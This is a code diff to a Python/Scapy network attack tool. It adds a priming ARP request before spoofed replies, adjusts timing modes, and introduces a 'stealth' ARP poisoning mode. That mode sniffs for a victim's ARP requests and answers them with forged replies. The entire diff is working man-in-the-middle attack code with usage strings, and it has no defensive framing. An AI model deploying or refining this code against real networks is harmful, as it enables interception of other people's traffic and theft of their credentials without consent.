@@ -3,10 +3,15 @@ import shlex
 import threading
 import time
 
-# ARP spoofing
 def arp_spoof(target_ip, spoofed_ip):
-    packet = sc.ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
-    sc.send(packet, verbose=False)
+    # Send ARP request to "prime" the target's ARP table - spoofed_ip asking "who has target_ip?"
+    request = sc.ARP(op=1, pdst=target_ip, psrc=spoofed_ip)
+    sc.send(request, verbose=False)
+    time.sleep(1)
+
+    # Send the spoofed ARP reply to poison the target table
+    reply = sc.ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
+    sc.send(reply, verbose=False)
 
 # Continuously send ARP spoofing packets
 def arp_spoof_loop(target_ip, spoofed_ip, interval):
@@ -42,7 +47,7 @@ def start_limited_arp_thread(target_ip, spoofed_ip, count):
 def start_arp_poison(cmd):
     args = shlex.split(cmd)
     target_ip = spoofed_ip =  None
-    interval = 5 # default value
+    interval = 10 # default value
     for i, arg in enumerate(args):
         if arg == "-tgtip" and i + 1 < len(args):
             target_ip = args[i + 1]
@@ -50,10 +55,8 @@ def start_arp_poison(cmd):
             spoofed_ip = args[i + 1]
         elif arg == "-mode" and i + 1 < len(args):
             mode = args[i + 1]
-            if mode == "aggresive":
+            if mode == "aggressive":
                 interval = 1
-            elif mode == "silent":
-                interval = 10
     if not target_ip or not spoofed_ip:
         print("[!] Usage: arp_poison -tgtip <target_ip> -spip <spoofed_ip>")
         return
@@ -78,6 +81,33 @@ def start_arp_poison_ssl(cmd):
     start_arp_thread(target_ip, spoofed_ip, 5)
     start_arp_thread(spoofed_ip, target_ip, 5)
     
-    
 
+def stealth_arp_poison(cmd):
+    args = shlex.split(cmd)
+    target_ip = spoofed_ip = interface = None
 
+    for i, arg in enumerate(args):
+        if arg == "-tgtip" and i + 1 < len(args):
+            target_ip = args[i + 1]
+        elif arg == "-spip" and i + 1 < len(args):
+            spoofed_ip = args[i + 1]
+        elif arg == "-iface" and i + 1 < len(args):
+            interface = args[i + 1]
+
+    if not target_ip or not spoofed_ip:
+        print("[!] Usage: stealth_arp -tgtip <target_ip> -spip <spoofed_ip> [-iface <interface>]")
+        return
+
+    def arp_sniffer(packet):
+        if packet.haslayer(sc.ARP):
+            arp = packet[sc.ARP]
+            if arp.op == 1 and arp.psrc == target_ip and arp.pdst == spoofed_ip:
+                print("[+] Victim %s requested %s. Sending spoofed reply." % (target_ip, spoofed_ip))
+                reply = sc.ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
+                for _ in range(3):
+                    sc.send(reply, verbose=False)
+                    time.sleep(0.05)
+
+    iface = interface or sc.conf.iface
+    print("[!] Listening on interface %s for ARP requests from %s about %s..." % (iface, target_ip, spoofed_ip))
+    sc.sniff(filter="arp", prn=arp_sniffer, store=False, iface=iface)
